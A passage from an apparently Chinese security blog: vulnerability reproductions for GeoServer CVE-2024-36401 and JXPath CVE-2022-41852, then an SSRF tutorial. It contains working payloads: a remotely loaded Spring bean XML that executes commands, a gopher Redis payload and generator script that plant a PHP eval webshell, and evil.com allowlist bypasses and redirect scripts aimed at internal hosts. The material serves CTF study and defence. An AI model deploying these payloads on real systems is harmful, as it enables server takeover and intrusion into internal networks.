src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109222510886.png" alt="image-20250109222510886"></p><h3 id="定位漏洞">定位漏洞</h3><p>由前面可知，GetPropertyValue是我们要定位的位置，找到类的位置。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223053220.png" alt="image-20250109223053220"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223140901.png" alt></p><p>对run方法进行断点，进行单步调试，定位到代码propertyNameNoIndexes.evaluate处，这里调用了geotool的evaluate方法，跟进</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223804405.png" alt="image-20250109223804405"></p><p>发现org.geotools.filter.AttributeExpressionImpl#evaluate(java.lang.Object, java.lang.Class<T>)中调用了accessor.get，再跟进</T></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109225119903.png" alt="image-20250109225119903"></p><p>这里调用了存在漏洞的<code>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor#get</code>触发了漏洞。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109225403954.png" alt="image-20250109225403954"></p><h3 id="CVE-2022-41852-XPath漏洞">CVE-2022-41852 XPath漏洞</h3><h4 id="漏洞描述">漏洞描述</h4><p>Apache Commons JXPath安全漏洞，攻击者可以利用除compile()和compilePath()函数之外的所有处理XPath字符串的JXPathContext等函数通过XPath表达式从类路径加载任何Java类，从而执行恶意代码。</p><p>JXPath及用法：</p><p><a href="https://commons.apache.org/proper/commons-jxpath/users-guide.html">https://commons.apache.org/proper/commons-jxpath/users-guide.html</a></p><h4 id="利用范围">利用范围</h4><p>Apache Commons JXPath &lt;= 1.3</p><h4 id="漏洞复现-2">漏洞复现</h4><p>下载POC：<a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></p><p>POC使用Spring框架，简单实现接受用户输入并使用它从Person类中检索指定的数据。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110115215618.png" alt="image-20250110115215618"></p><p>启动Spring，在本地创建一个test.xml，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;commandRunner&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>open<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>-a<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地再开启一个80端口，用于远程加载test.xml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/vulnerable-example?path=org.springframework.context.support.ClassPathXmlApplicationContext.new(%22http://127.0.0.1/test.xml%22)</span><br></pre></td></tr></table></figure><p>开启调试，断点，调用了org.apache.commons.jxpath.JXPathContext#getValue(java.lang.String)方法，跟进</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130016519.png" alt="image-20250110130016519"></p><p>跟进org.apache.commons.jxpath.ri.compiler.Expression#computeValue</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130144114.png" alt="image-20250110130144114"></p><p>继续跟进到org.apache.commons.jxpath.Function#invoke函数中，实现了Spring-Bean加载，执行恶意代码。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130533234.png" alt="image-20250110130533234"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110131339598.png" alt="image-20250110131339598"></p><h2 id="参考">参考</h2><p>CVE-2024-36401参考：</p><p><a href="https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/README.zh-cn.md</a></p><p><a href="https://www.bilibili.com/video/BV1bb421n7M2/?share_source=copy_web&amp;vd_source=40fffae7c3c0198962dc9cf9689a1a8a">https://www.bilibili.com/video/BV1bb421n7M2/?share_source=copy_web&amp;vd_source=40fffae7c3c0198962dc9cf9689a1a8a</a></p><p><a href="https://xz.aliyun.com/t/14991">https://xz.aliyun.com/t/14991</a></p><p>CVE-2022-41852参考：</p><p><a href="https://www.anquanke.com/post/id/281941">https://www.anquanke.com/post/id/281941</a></p><p><a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> Java </tag>
            
            <tag> XPath </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞篇</title>
      <link href="/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/"/>
      <url>/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF打Redis">SSRF打Redis</h2><p>CTF show的WEB入门360关卡，打Redis。</p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现6379端口开放，6379端口，一般为Redis。</p><p><img src="/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/1.png" alt></p><p>打入Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25245%250D%250A1.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure><p>成功。</p><p><img src="/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/2.png" alt></p><h3 id="使用到了gopher协议">使用到了gopher协议</h3><blockquote><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，当然现在 Gopher 协议已经慢慢淡出历史。<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。</p></blockquote><p>特定的协议开头，“_”后面跟着内容部分。</p><p><code>gopher://127.0.0.1:6379/_</code></p><h3 id="Redis的语法">Redis的语法</h3><p>上述使用的Payload是基于存在Redis未授权漏洞的情况下，无需密码，下面我们来简单分析一下使用的payload。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1</span></span><br><span class="line">1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">dir</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">13</span></span><br><span class="line">/var/www/html</span><br><span class="line">*4</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">10</span></span><br><span class="line">dbfilename</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">5</span></span><br><span class="line">1.php</span><br><span class="line">*1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><code>*3</code>指的是三个变量，<code>$3</code>指的是字符的长度为3。</p><p>正常我们使用Redis的语法，首先需要进行登录，存在未授权可直接登录，不存在则需要密码登录。</p><p><code>redis-cli -h 192.168.73.150 -a password</code></p><p>上传Webshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &lt;?php$&#123;IFS&#125;eval($_POST[1]);?&gt;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename 1.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>注意</strong></em>：我注意到很多打CTF的同学使用的<code>Gopherus</code>去生成的payload，我发现<code>Gopherus</code>在生成payload时，使用到了<code>flushall</code>命令，该命令用于清空 Redis 服务器中的所有数据库，数据会被永久删除，切记不可用于实际环境中！</p></blockquote><p>网上翻到的脚本，实测可行，SSRF打Redis的redis_shell.py如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"><span class="comment">#shell</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_POST[1]);?&gt;\n\n&quot;</span></span><br><span class="line"><span class="comment">#文件名</span></span><br><span class="line">filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"><span class="comment">#redis密码</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[</span><br><span class="line">    <span class="comment">#&quot;auth passwd&quot;,</span></span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += quote(redis_format(x))</span><br><span class="line">    <span class="comment">#最后的结果要对&quot;_&quot;后面进行一次url编码</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h3 id="⚠️注意点">⚠️注意点</h3><p>在使用SSRF打Redis时，对于&quot;gopher://127.0.0.1:6379/_&quot;后的内容需要进行一次url编码。</p><h2 id="SSRF的绕过">SSRF的绕过</h2><p>学习SSRF不能仅仅局限于CTF比赛中，更多的是要运用在实际的环境中。</p><h3 id="绕过URL匹配字符的限制">绕过URL匹配字符的限制</h3><p><strong>后端对请求的URL进行字符匹配检测。</strong></p><p>下面，<code>evil.com</code>为恶意的域名，<code>target.com</code>为正常的业务域名。</p><p>例如，直接判断URL中是否包含某个<code>target.com</code>。使用@进行绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://target.com@evil.com</span><br></pre></td></tr></table></figure><p>例如，使用字符串匹配的方式，判断域名中是否存在某个子域名，如必须包含<code>qq.com</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://target.com.evil.com</span><br></pre></td></tr></table></figure><p><strong>解析的差异。</strong></p><p>例如，前后端分离，对URL的解析差异不同，绕过检测。有的后端会把<code>\.</code>和<code>\@</code>解析成<code>.</code>和<code>@</code>，则会解析到<code>evil.com</code>。若把<code>\</code>解析为<code>/</code>，则不存在问题，还是正常解析到<code>target.com</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://target.com\.evil.com</span><br><span class="line">https://target.com\@evil.com</span><br></pre></td></tr></table></figure><h3 id="直接302跳转">直接302跳转</h3><p>利用302跳转，跳转到内网的地址上，实现<code>SSRF</code>。</p><p>使用<code>php</code>代码实现，<code>302.php</code>如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 设置跳转目标内网URL</span></span><br><span class="line">    <span class="variable">$target_url</span>=<span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">    <span class="comment">// 发送302跳转头信息</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="有条件的302跳转">有条件的302跳转</h3><p>要考虑实际环境中是否有相关的过滤。我自己想到的过滤有以下几种，具体要根据实际情况分析。</p><h4 id="1-、后端验证了跳转的目标域名">(1)、后端验证了跳转的目标域名</h4><p>后端代码验证了跳转的目标URL的域名，是否为白名单中的域名。绕过这种验证，需要找到白名单域名中的一个302跳转，即可实现绕过。</p><p>自己的服务器上部署<code>r.php</code>，对应的URL为<code>https://evil.com/r.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 设置跳转目标内网URL</span></span><br><span class="line">    <span class="variable">$target_url</span>=<span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">    <span class="comment">// 发送302跳转头信息</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在302跳转的白名单域名，如下：</p><p><code>https://vulnerable.com/?redirect_url=</code></p><p>则跳转的地址为：</p><p><code>https://vulnerable.com/?redirect_url=https%3A%2F%2Fevil.com%2Fr.php</code></p><p><code>vulnerable.com</code>为白名单域名，绕过了白名单的限制。</p><h4 id="2-、后端验证了请求返回的数据包">(2)、后端验证了请求返回的数据包</h4><p>后端代码对请求的URL的返回结果进行了验证。返回的响应数据包中的每一个内容都有可能作为后端限制的条件，这里绕过限制的方法就是去想办法构造，满足后端代码的判断条件，然后再进行302的跳转。</p><p><strong>例如</strong>，即后端验证请求的URL返回的状态码只能是特定的，如200。此时要在使用dnslog进行<code>SSRF</code>测试的时候注意，后端代码对URL进行了几次请求，有可能的情况是先对URL请求一次验证状态码是200，满足条件后，后续几次请求未对返回内容进行验证。此时我们可以编写代码，进行请求次数的限定，第一次请求返回200，第n次请求返回302跳转，跳转到内网的地址中。</p><p>使用<code>nodejs</code>实现<code>ssrf.js</code>，代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> requestCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/1&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    requestCount++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> personalInfo = &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">28</span>,</span><br><span class="line">        <span class="attr">email</span>: <span class="string">&quot;zhangsan@example.com&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录访问日志</span></span><br><span class="line">    <span class="keyword">const</span> logMessage = &#123;</span><br><span class="line">        <span class="attr">timestamp</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>(),</span><br><span class="line">        <span class="attr">requestCount</span>: requestCount,</span><br><span class="line">        <span class="attr">method</span>: req.<span class="property">method</span>,</span><br><span class="line">        <span class="attr">headers</span>: req.<span class="property">headers</span>,</span><br><span class="line">        <span class="attr">query</span>: req.<span class="property">query</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;访问日志:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(logMessage, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="comment">//请求的次数</span></span><br><span class="line">    <span class="keyword">if</span> (requestCount &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 返回状态 200 和个人信息的 JSON 数据</span></span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(personalInfo);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 第 5 次访问，返回状态 302 跳转到百度</span></span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="number">302</span>, <span class="string">&#x27;http://127.0.0.1/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器正在运行，访问 http://localhost:<span class="subst">$&#123;PORT&#125;</span>/1`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>请求第1次，返回正常的个人信息内容，请求第2次，则进行302跳转，跳转到内网中。</p><p><strong>例如</strong>，后端代码验证的请求的URL只能是特定的<code>User-Agent</code>头。</p><p>使用<code>php</code>实现<code>1.php</code>，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 获取请求的 User-Agent</span></span><br><span class="line">    <span class="variable">$userAgent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    <span class="comment">// 检查 User-Agent 是否包含 okhttp/3.12.1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$userAgent</span>, <span class="string">&#x27;okhttp/3.12.1&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: https://www.baidu.com&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(); <span class="comment">// 确保停止脚本执行</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 设置跳转目标URL</span></span><br><span class="line">    <span class="variable">$target_url</span> = <span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="内网html渲染">内网html渲染</h3><p>后端代码在处理前端传输的<code>html</code>内容时，会对输入的内容进行渲染，例如，文本转换为PDF、在线简历生成等可能存在<code>html</code>渲染的功能点。</p><h4 id="1-、使用iframe标签直接读取内网">(1)、使用iframe标签直接读取内网</h4><p>代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span 